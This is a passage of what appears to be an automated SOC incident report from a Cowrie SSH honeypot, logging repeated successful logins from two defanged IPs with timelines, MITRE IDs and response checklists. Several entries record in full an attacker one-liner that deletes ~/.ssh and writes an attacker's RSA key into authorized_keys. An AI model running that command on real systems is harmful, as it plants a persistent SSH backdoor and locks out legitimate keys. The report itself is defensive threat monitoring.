| `2026-05-04 16:34:34` | `cowrie.client.version` |
| `2026-05-04 16:34:34` | `cowrie.client.kex` |
| `2026-05-04 16:34:35` | `cowrie.login.success` |
| `2026-05-04 16:34:36` | `cowrie.session.params` |
| `2026-05-04 16:34:36` | `cowrie.command.input` |
| `2026-05-04 16:34:36` | `cowrie.command.failed` |
| `2026-05-04 16:34:36` | `cowrie.log.closed` |
| `2026-05-04 16:34:37` | `cowrie.session.params` |
| `2026-05-04 16:34:37` | `cowrie.command.input` |
| `2026-05-04 16:34:37` | `cowrie.session.file_download` |
| `2026-05-04 16:34:37` | `cowrie.log.closed` |
| `2026-05-04 16:34:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0298653d297

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:34 |
| **Last Seen** | 2026-05-04 16:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:34:40` | `cowrie.session.connect` |
| `2026-05-04 16:34:40` | `cowrie.client.version` |
| `2026-05-04 16:34:41` | `cowrie.client.kex` |
| `2026-05-04 16:34:42` | `cowrie.login.success` |
| `2026-05-04 16:34:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0efbbe1f38a6

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:35 |
| **Last Seen** | 2026-05-04 16:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:35:36` | `cowrie.session.connect` |
| `2026-05-04 16:35:36` | `cowrie.client.version` |
| `2026-05-04 16:35:36` | `cowrie.client.kex` |
| `2026-05-04 16:35:37` | `cowrie.login.success` |
| `2026-05-04 16:35:38` | `cowrie.session.params` |
| `2026-05-04 16:35:38` | `cowrie.command.input` |
| `2026-05-04 16:35:38` | `cowrie.command.failed` |
| `2026-05-04 16:35:38` | `cowrie.log.closed` |
| `2026-05-04 16:35:39` | `cowrie.session.params` |
| `2026-05-04 16:35:39` | `cowrie.command.input` |
| `2026-05-04 16:35:39` | `cowrie.session.file_download` |
| `2026-05-04 16:35:39` | `cowrie.log.closed` |
| `2026-05-04 16:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7086d3abadc

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:35 |
| **Last Seen** | 2026-05-04 16:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:35:43` | `cowrie.session.connect` |
| `2026-05-04 16:35:43` | `cowrie.client.version` |
| `2026-05-04 16:35:44` | `cowrie.client.kex` |
| `2026-05-04 16:35:45` | `cowrie.login.success` |
| `2026-05-04 16:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f88700991e1f

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:36 |
| **Last Seen** | 2026-05-04 16:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:36:39` | `cowrie.session.connect` |
| `2026-05-04 16:36:39` | `cowrie.client.version` |
| `2026-05-04 16:36:39` | `cowrie.client.kex` |
| `2026-05-04 16:36:40` | `cowrie.login.success` |
| `2026-05-04 16:36:41` | `cowrie.session.params` |
| `2026-05-04 16:36:41` | `cowrie.command.input` |
| `2026-05-04 16:36:41` | `cowrie.command.failed` |
| `2026-05-04 16:36:41` | `cowrie.log.closed` |
| `2026-05-04 16:36:41` | `cowrie.session.params` |
| `2026-05-04 16:36:41` | `cowrie.command.input` |
| `2026-05-04 16:36:42` | `cowrie.session.file_download` |
| `2026-05-04 16:36:42` | `cowrie.log.closed` |
| `2026-05-04 16:36:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e0de598db37

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:36 |
| **Last Seen** | 2026-05-04 16:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:36:45` | `cowrie.session.connect` |
| `2026-05-04 16:36:45` | `cowrie.client.version` |
| `2026-05-04 16:36:46` | `cowrie.client.kex` |
| `2026-05-04 16:36:47` | `cowrie.login.success` |
| `2026-05-04 16:36:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-326bf4733157

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:37 |
| **Last Seen** | 2026-05-04 16:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:37:43` | `cowrie.session.connect` |
| `2026-05-04 16:37:43` | `cowrie.client.version` |
| `2026-05-04 16:37:43` | `cowrie.client.kex` |
| `2026-05-04 16:37:44` | `cowrie.login.success` |
| `2026-05-04 16:37:45` | `cowrie.session.params` |
| `2026-05-04 16:37:45` | `cowrie.command.input` |
| `2026-05-04 16:37:45` | `cowrie.command.failed` |
| `2026-05-04 16:37:45` | `cowrie.log.closed` |
| `2026-05-04 16:37:46` | `cowrie.session.params` |
| `2026-05-04 16:37:46` | `cowrie.command.input` |
| `2026-05-04 16:37:46` | `cowrie.session.file_download` |
| `2026-05-04 16:37:46` | `cowrie.log.closed` |
| `2026-05-04 16:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-259ab189168d

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:37 |
| **Last Seen** | 2026-05-04 16:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:37:50` | `cowrie.session.connect` |
| `2026-05-04 16:37:50` | `cowrie.client.version` |
| `2026-05-04 16:37:50` | `cowrie.client.kex` |
| `2026-05-04 16:37:51` | `cowrie.login.success` |
| `2026-05-04 16:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f0d605a31b4

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:37 |
| **Last Seen** | 2026-05-04 16:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:37:58` | `cowrie.session.connect` |
| `2026-05-04 16:37:58` | `cowrie.client.version` |
| `2026-05-04 16:37:58` | `cowrie.client.kex` |
| `2026-05-04 16:37:59` | `cowrie.login.success` |
| `2026-05-04 16:37:59` | `cowrie.session.params` |
| `2026-05-04 16:37:59` | `cowrie.command.input` |
| `2026-05-04 16:37:59` | `cowrie.command.failed` |
| `2026-05-04 16:37:59` | `cowrie.log.closed` |
| `2026-05-04 16:38:00` | `cowrie.session.params` |
| `2026-05-04 16:38:00` | `cowrie.command.input` |
| `2026-05-04 16:38:00` | `cowrie.session.file_download` |
| `2026-05-04 16:38:00` | `cowrie.log.closed` |
| `2026-05-04 16:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7caa49212fe

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:38 |
| **Last Seen** | 2026-05-04 16:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:38:02` | `cowrie.session.connect` |
| `2026-05-04 16:38:02` | `cowrie.client.version` |
| `2026-05-04 16:38:02` | `cowrie.client.kex` |
| `2026-05-04 16:38:03` | `cowrie.login.success` |
| `2026-05-04 16:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f76fe45aa1ec

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:38 |
| **Last Seen** | 2026-05-04 16:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:38:51` | `cowrie.session.connect` |
| `2026-05-04 16:38:51` | `cowrie.client.version` |
| `2026-05-04 16:38:52` | `cowrie.client.kex` |
| `2026-05-04 16:38:53` | `cowrie.login.success` |
| `2026-05-04 16:38:54` | `cowrie.session.params` |
| `2026-05-04 16:38:54` | `cowrie.command.input` |
| `2026-05-04 16:38:54` | `cowrie.command.failed` |
| `2026-05-04 16:38:54` | `cowrie.log.closed` |
| `2026-05-04 16:38:55` | `cowrie.session.params` |
| `2026-05-04 16:38:55` | `cowrie.command.input` |
| `2026-05-04 16:38:55` | `cowrie.session.file_download` |
| `2026-05-04 16:38:55` | `cowrie.log.closed` |
| `2026-05-04 16:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fe96a377305

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:38 |
| **Last Seen** | 2026-05-04 16:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:38:59` | `cowrie.session.connect` |
| `2026-05-04 16:38:59` | `cowrie.client.version` |
| `2026-05-04 16:38:59` | `cowrie.client.kex` |
| `2026-05-04 16:39:00` | `cowrie.login.success` |
| `2026-05-04 16:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adc78b1796cf

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:39 |
| **Last Seen** | 2026-05-04 16:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:39:56` | `cowrie.session.connect` |
| `2026-05-04 16:39:56` | `cowrie.client.version` |
| `2026-05-04 16:39:56` | `cowrie.client.kex` |
| `2026-05-04 16:39:57` | `cowrie.login.success` |
| `2026-05-04 16:39:58` | `cowrie.session.params` |
| `2026-05-04 16:39:58` | `cowrie.command.input` |
| `2026-05-04 16:39:58` | `cowrie.command.failed` |
| `2026-05-04 16:39:58` | `cowrie.log.closed` |
| `2026-05-04 16:39:59` | `cowrie.session.params` |
| `2026-05-04 16:39:59` | `cowrie.command.input` |
| `2026-05-04 16:39:59` | `cowrie.session.file_download` |
| `2026-05-04 16:39:59` | `cowrie.log.closed` |
| `2026-05-04 16:40:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10b13170324b

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:40 |
| **Last Seen** | 2026-05-04 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:40:03` | `cowrie.session.connect` |
| `2026-05-04 16:40:03` | `cowrie.client.version` |
| `2026-05-04 16:40:03` | `cowrie.client.kex` |
| `2026-05-04 16:40:04` | `cowrie.login.success` |
| `2026-05-04 16:40:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88882f6cae76

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:41 |
| **Last Seen** | 2026-05-04 16:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:41:03` | `cowrie.session.connect` |
| `2026-05-04 16:41:03` | `cowrie.client.version` |
| `2026-05-04 16:41:03` | `cowrie.client.kex` |
| `2026-05-04 16:41:04` | `cowrie.login.success` |
| `2026-05-04 16:41:05` | `cowrie.session.params` |
| `2026-05-04 16:41:05` | `cowrie.command.input` |
| `2026-05-04 16:41:05` | `cowrie.command.failed` |
| `2026-05-04 16:41:05` | `cowrie.log.closed` |
| `2026-05-04 16:41:06` | `cowrie.session.params` |
| `2026-05-04 16:41:06` | `cowrie.command.input` |
| `2026-05-04 16:41:06` | `cowrie.session.file_download` |
| `2026-05-04 16:41:06` | `cowrie.log.closed` |
| `2026-05-04 16:41:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-046fba7328ed

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:41 |
| **Last Seen** | 2026-05-04 16:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:41:09` | `cowrie.session.connect` |
| `2026-05-04 16:41:09` | `cowrie.client.version` |
| `2026-05-04 16:41:10` | `cowrie.client.kex` |
| `2026-05-04 16:41:11` | `cowrie.login.success` |
| `2026-05-04 16:41:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92b71820a7ac

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:42 |
| **Last Seen** | 2026-05-04 16:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:42:07` | `cowrie.session.connect` |
| `2026-05-04 16:42:07` | `cowrie.client.version` |
| `2026-05-04 16:42:07` | `cowrie.client.kex` |
| `2026-05-04 16:42:08` | `cowrie.login.success` |
| `2026-05-04 16:42:09` | `cowrie.session.params` |
| `2026-05-04 16:42:09` | `cowrie.command.input` |
| `2026-05-04 16:42:09` | `cowrie.command.failed` |
| `2026-05-04 16:42:09` | `cowrie.log.closed` |
| `2026-05-04 16:42:10` | `cowrie.session.params` |
| `2026-05-04 16:42:10` | `cowrie.command.input` |
| `2026-05-04 16:42:10` | `cowrie.session.file_download` |
| `2026-05-04 16:42:10` | `cowrie.log.closed` |
| `2026-05-04 16:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3506360dc82

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:42 |
| **Last Seen** | 2026-05-04 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:42:13` | `cowrie.session.connect` |
| `2026-05-04 16:42:13` | `cowrie.client.version` |
| `2026-05-04 16:42:14` | `cowrie.client.kex` |
| `2026-05-04 16:42:15` | `cowrie.login.success` |
| `2026-05-04 16:42:15` | `cowrie.session.closed` |

